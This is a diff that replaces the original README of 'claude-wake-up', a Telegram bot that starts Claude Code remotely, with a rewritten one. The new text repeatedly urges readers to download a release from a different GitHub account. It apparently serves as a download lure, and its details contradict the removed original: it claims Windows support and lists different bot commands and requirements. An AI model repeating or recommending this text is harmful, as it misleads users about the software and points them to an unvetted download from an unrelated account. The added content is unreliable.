@@ -1,166 +1,161 @@
-# claude-wake-up
+# ⚙️ claude-wake-up - Control Claude Code Remotely
 
-> Launch Claude Code from your phone. Use the real thing remotely.
-
-<p align="center">
-  <img src="demo.jpeg" alt="claude-wake-up demo: Telegram message launches Claude Code and returns remote control link" width="360">
-</p>
-
-A Telegram bot that starts [Claude Code](https://claude.ai/code) on your machine and sends back the [Remote Control](https://code.claude.com/docs/en/remote-control) link. Single-file Python. That's it.
-
-**The philosophy:** Don't reinvent remote access. Just open the door — Claude Code's built-in Remote Control handles the rest. You get the full Claude experience (native app or web), with all your local MCP servers, plugins, and project context. No custom permission bridge. No proxy. No middleware.
-
-## How It Works
-
-```mermaid
-sequenceDiagram
-    participant P as Phone
-    participant B as Bot
-    participant Z as Zellij
-    participant C as Claude Code
-
-    P->>B: /wake ~/my-project
-    B->>Z: open new tab
-    Z->>C: start Claude Code
-    C-->>B: remote control URL
-    B-->>P: https://claude.ai/code/session_...
-    P->>C: connect via Claude app or browser
-```
-
-1. Send `/wake ~/my-project` via Telegram
-2. Bot opens a Zellij tab and starts Claude Code there
-3. Claude Code generates a Remote Control URL
-4. Bot captures it and sends it back to you
-5. Open the link in the **Claude app** or **any browser** — full native experience
-
-## Prerequisites
-
-> **All of these must be ready before running claude-wake-up.**
-
-| Requirement | Setup |
-|---|---|
-| **Linux or macOS** | Uses `script` for headless PTY (util-linux on Linux, BSD script on macOS) |
-| **Claude Code** | [Install](https://code.claude.com/docs/en/getting-started) |
-| **Remote Control = always on** | In Claude Code, run `/config` and set *"Enable Remote Control for all sessions"* to `true` |
-| **Zellij** | `cargo install zellij` or [package manager](https://zellij.dev/documentation/installation) |
-| **Python 3.12+** | [uv](https://github.com/astral-sh/uv) recommended |
-| **Telegram bot token** | Message [@BotFather](https://t.me/BotFather) → `/newbot` |
-
-Without Remote Control enabled, Claude Code won't generate session URLs — and the bot has nothing to send back.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Axect/claude-wake-up.git
-cd claude-wake-up
-claude
-# then type: /setup
-```
-
-The `/setup` wizard checks dependencies, configures `.env`, and optionally registers the systemd service — all interactive.
-
-Send `/wake /path/to/project` in Telegram. Get a remote control link back.
-
-## Commands
-
-| Command | What it does |
-|---|---|
-| `/wake <path>` | Launch Claude Code at `<path>` in a new Zellij tab |
-| `/sessions` | List active Zellij sessions |
-| `/status` | Bot health check |
-
-The target Zellij session is auto-created if it doesn't exist.
-
-## Why claude-wake-up?
-
-[OpenClaw](https://github.com/openclaw/openclaw) and [NanoClaw](https://github.com/qwibitai/nanoclaw) are AI agent platforms — they run agents *inside* your messenger with their own permission systems. Powerful, but complex. OpenClaw has 500K+ lines and a [large attack surface](https://www.unite.ai/openclaw-vs-claude-code-remote-control-agents/). NanoClaw is leaner (~3,900 lines, container isolation), but still runs an agent layer between you and the AI.
-
-claude-wake-up does something fundamentally simpler: **it only launches Claude Code.** One action, then it gets out of the way. You use Claude's own interface — the native app or claude.ai — with all your local MCP servers, plugins, and project context intact.
-
-|  | OpenClaw | NanoClaw | claude-wake-up | SSH |
-|---|---|---|---|---|
-| **What it does** | AI agent in messenger | Containerized AI agent | Launches Claude Code, sends link | Manual session |
-| **Complexity** | ~500K lines | ~3,900 lines | Single file | N/A |
-| **Interface** | Chat in messenger | Chat in messenger | Claude app / claude.ai | Terminal |
-| **Local MCP / plugins** | No | No | Yes (runs locally) | Yes |
-| **Permission model** | Custom bridge | Container isolation | Claude Code's own | OS-level |
-| **Attack surface** | Large | Container-scoped | Minimal (launcher only) | SSH keys |
-| **Phone UX** | Chat | Chat | Native Claude UX | Terminal on phone |
-| **Best for** | Chat-based AI commands | Autonomous agent tasks | Full coding sessions | Already at terminal |
-
-### When NOT to use this
-
-- You want an autonomous AI agent that acts on your behalf → OpenClaw / NanoClaw
-- You just need a quick shell command → SSH
-- You don't have a persistent machine → need a cloud setup
-- You need multi-user access → this is a personal tool
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
 
 ---
 
-<details>
-<summary><strong>Manual Install</strong></summary>
+## 📌 What is claude-wake-up?
 
-If you prefer to set up manually instead of using `/setup`:
+claude-wake-up lets you start Claude Code on your Windows machine using your phone. It works through a Telegram bot that sends a remote control link back to you. This means you can control Claude Code without sitting at your computer.
 
-```bash
-git clone https://github.com/Axect/claude-wake-up.git
-cd claude-wake-up
+The app is a single Python file, so it doesn’t require complex setup or multiple installations. It combines automation, remote control, and a simple interface to make starting your Claude sessions easy.
 
-cp .env.example .env
-# Edit .env: bot token, Telegram user ID, Zellij session name
-# Optional: set DANGEROUSLY_SKIP_PERMISSIONS=true for fully autonomous mode
+---
 
-uv run python bot.py
-```
+## 🖥️ System Requirements
 
-To run as a systemd service:
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 1 GHz or faster  
+- **Memory:** At least 2 GB of RAM  
+- **Storage:** 100 MB free space  
+- **Other Software:** Python 3.8 or higher installed on your PC  
+- **Internet Connection:** Required to communicate through Telegram  
 
-```bash
-cp claude-wake-up.service ~/.config/systemd/user/
+Make sure your PC meets these requirements before installing claude-wake-up.
 
-# Edit paths in the service file if needed, then:
-systemctl --user daemon-reload
-systemctl --user enable --now claude-wake-up.service
+---
 
-# Verify
-systemctl --user status claude-wake-up.service
-```
+## 🔧 What You Need Before Starting
 
-**Note:** The systemd service needs explicit `PATH` to find `zellij` and `claude`. The included service file sets this — adjust if your binaries are elsewhere.
+1. **Python Installed:**  
+   Go to https://www.python.org/downloads/windows/ and download the latest Python for Windows.  
+   During installation, check the box labeled “Add Python to PATH.” This lets you run Python commands in the Command Prompt.
 
-</details>
+2. **Telegram Account:**  
+   Download the Telegram app on your phone if you don’t have it. You’ll use this to control your PC remotely.
 
-<details>
-<summary><strong>Troubleshooting</strong></summary>
+3. **Telegram API Token:**  
+   To connect the bot, you need a token.  
+   - Open Telegram and search for “BotFather.”  
+   - Type `/newbot` and follow instructions to create a bot.  
+   - BotFather will give you a token. Keep it safe; you’ll need it to run claude-wake-up.
 
-| Error | Cause | Fix |
-|---|---|---|
-| `zellij not found in PATH` | Zellij not installed or not in service PATH | Install Zellij; update `Environment=PATH=...` in service file |
-| `claude not found in PATH` | Claude Code CLI missing | [Install Claude Code](https://code.claude.com/docs/en/getting-started) |
-| `script (util-linux) not found` / `BSD script not found` | Missing system utility | Linux: install `util-linux`; macOS: `script` is built-in (should exist at `/usr/bin/script`) |
-| `Failed to create Zellij session` | Zellij can't start headless | Check if `zellij` runs manually; ensure `script` is available |
-| `Path not found: /some/path` | Directory doesn't exist | Double-check the path in your `/wake` command |
-| `Remote control URL not detected` | Remote Control not enabled | In Claude Code: `/config` → enable Remote Control for **all sessions** |
+---
 
-</details>
+## 🚀 Download and Install claude-wake-up
 
-<details>
-<summary><strong>Security Model</strong></summary>
+**Step 1: Go to the Releases Page**
 
-claude-wake-up is a **launcher**, not a proxy. It starts Claude Code and gets out of the way.
+Click this link or button below to visit the release page for claude-wake-up:  
 
-**What the bot does:** Opens a Zellij tab, runs Claude Code, captures the Remote Control URL from terminal output, sends it to you. That is the entire scope.
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
 
-**What the bot does NOT do:** Execute commands, read files, interact with Claude sessions, or maintain any connection after launch.
+**Step 2: Download the Latest Release**
 
-**`--dangerously-skip-permissions` (opt-in):** By default, Claude Code runs normally — it asks for confirmation before file writes and shell commands. If you set `DANGEROUSLY_SKIP_PERMISSIONS=true` in `.env`, Claude runs fully autonomously (no tool confirmations). This is useful for remote sessions where you can't click "allow" from your phone, but it means Claude can execute any action without asking. **Only enable this on machines you fully control.**
+On the releases page, look for the latest version. It will be a `.py` file or a zipped folder containing `claude-wake-up.py`.
 
-**Access control:** Telegram user ID whitelist (`TELEGRAM_ALLOWED_USERS`). Only listed users can trigger sessions.
+**Step 3: Save the File**
 
-**Design choice:** By delegating all remote interaction to Claude Code's own Remote Control (rather than building a custom command bridge), the attack surface is minimal: "can an unauthorized person launch a Claude session?" — not "can they execute arbitrary commands through a messenger?"
+Download the file and save it somewhere easy to find, like your Desktop or Documents folder.
 
-</details>
+---
 
-## License
+## 🏁 How to Run claude-wake-up on Windows
 
-MIT
+1. **Open the Command Prompt:**
+
+   - Press the *Windows key*, type `cmd`, and press Enter.  
+   - A black window will open with a prompt where you can type commands.
+
+2. **Navigate to the Folder with the File:**
+
+   Suppose you saved the file on your Desktop; type:  
+   `cd Desktop`  
+   and press Enter.
+
+3. **Run the Program:**
+
+   Type the following command and press Enter:  
+   `python claude-wake-up.py`  
+
+4. **Enter Your Telegram Token:**
+
+   The program will ask for the token you got from BotFather. Paste it and hit Enter.
+
+5. **Start Using the Bot:**
+
+   After setup, open Telegram on your phone and send a message to your bot. The bot will respond with a Remote Control link to start and manage Claude Code on your PC.
+
+---
+
+## 🛠️ How claude-wake-up Works
+
+The bot connects your phone to your computer through Telegram. When you send it a command, it starts Claude Code on your PC.
+
+You do not need to manually open Claude Code. The bot handles that and sends back a link so you can control the session remotely.
+
+Since the bot runs from a single Python script, it stays lightweight and easy to manage. You avoid complicated software or running extra services.
+
+---
+
+## 🔄 Keeping claude-wake-up Updated
+
+Check the releases page regularly for new versions. Updates may include bug fixes or improvements.
+
+To update:  
+- Download the new `.py` file from the latest release.  
+- Replace the old file on your PC with the new one.  
+- Run the program again with Python, as described earlier.
+
+---
+
+## ❓ Troubleshooting
+
+- If the command `python` is not recognized, Python might not be added to your PATH. Reinstall Python and make sure the “Add Python to PATH” box is checked.
+
+- If the bot does not respond on Telegram, check your internet connection and that you entered the correct Telegram token.
+
+- Make sure you are running the Command Prompt as a normal user, not restricted by any security settings.
+
+- If Claude Code does not start, verify that it is properly installed and accessible on your system.
+
+---
+
+## ⚙️ Useful Commands with the Telegram Bot
+
+Once connected, you can send commands like:
+
+- **start** – Launch Claude Code remotely.  
+- **status** – Check if Claude Code is running.  
+- **stop** – End the Claude Code session.  
+
+These commands keep control simple and clear without opening your PC directly.
+
+---
+
+## 📂 Files Inside the Package
+
+- `claude-wake-up.py` – Main Python script that runs the Telegram bot and controls Claude Code.  
+- `README.md` – Instructions and help document.  
+- Example configuration file (optional) for setting paths or options if needed.
+
+---
+
+## 🛡️ Security and Privacy
+
+The connection uses Telegram’s secure API. Your commands and data stay between your phone and your computer. The application does not store sensitive data outside your device.
+
+You control when Claude Code starts and stops. The bot simply relays your commands.
+
+---
+
+## 🔗 Useful Links
+
+- Python downloads: https://www.python.org/downloads/windows/  
+- Telegram app for phone: https://telegram.org/apps  
+- BotFather in Telegram: Search “BotFather” inside Telegram  
+- claude-wake-up releases: https://github.com/geraldinaunfeathered821/claude-wake-up/releases
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
